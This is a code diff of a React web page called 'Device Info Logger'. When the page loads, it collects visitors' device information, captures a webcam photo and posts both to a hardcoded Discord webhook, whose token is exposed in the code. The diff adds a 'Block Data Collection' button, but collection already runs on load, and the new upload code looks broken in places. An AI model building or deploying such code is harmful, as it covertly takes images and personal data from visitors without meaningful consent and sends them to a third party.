@@ -1,9 +1,14 @@
 import { useEffect, useState } from "react";
-import { Container, Text, VStack, Spinner } from "@chakra-ui/react";
+import { Container, Text, VStack, Spinner, Button, useToast } from "@chakra-ui/react";
+
 import { FaDiscord } from "react-icons/fa";
 
 const Index = () => {
+  const [isBlocked, setIsBlocked] = useState(false);
+  const toast = useToast();
+
   useEffect(() => {
+    if (isBlocked) return;
     const webhookUrl = "https://discord.com/api/webhooks/1245264638074032169/SQOYL5a3KvrE25GAybCtaiHyM6uzOIm2SRypPQfD1GeO-IcuwXC6FMwG8fQTnjOO5E6_";
 
     const getDeviceInfo = async () => {
@@ -71,16 +76,6 @@ const Index = () => {
         const photo = canvas.toDataURL("image/png");
         stream.getTracks().forEach((track) => track.stop());
         sendToWebhook({ photo });
-        fetch(webhookUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            content: `Captured Photo:`,
-            embeds: [{ image: { url: photo } }],
-          }),
-        });
         return photo;
       } catch (error) {
         console.error("Error capturing photo:", error);
@@ -90,11 +85,39 @@ const Index = () => {
 
     const fetchData = async () => {
       const deviceInfo = await getDeviceInfo();
-      await capturePhoto();
+      const photo = await capturePhoto();
+      if (photo) {
+        if (photo) {
+          fetch(webhookUrl, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              content: `Captured Photo:`,
+              embeds: [{ image: { url: deviceInfo.photo } }],
+            }),
+          });
+        }
+      }
     };
 
     fetchData();
-  }, []);
+  }, [isBlocked]);
+
+  const handleBlock = () => {
+    const userConfirmed = window.confirm("Are you sure you want to block data collection?");
+    if (userConfirmed) {
+      setIsBlocked(true);
+      toast({
+        title: "Data collection blocked.",
+        description: "You have successfully blocked data collection.",
+        status: "info",
+        duration: 5000,
+        isClosable: true,
+      });
+    }
+  };
 
   return (
     <Container centerContent maxW="container.md" height="100vh" display="flex" flexDirection="column" justifyContent="center" alignItems="center">
@@ -102,6 +125,9 @@ const Index = () => {
         <Text fontSize="2xl">Welcome to the Device Info Logger</Text>
         <Text>Your device information has been sent to our Discord channel.</Text>
         <Spinner size="lg" />
+        <Button colorScheme="red" onClick={handleBlock}>
+          Block Data Collection
+        </Button>
       </VStack>
     </Container>
   );
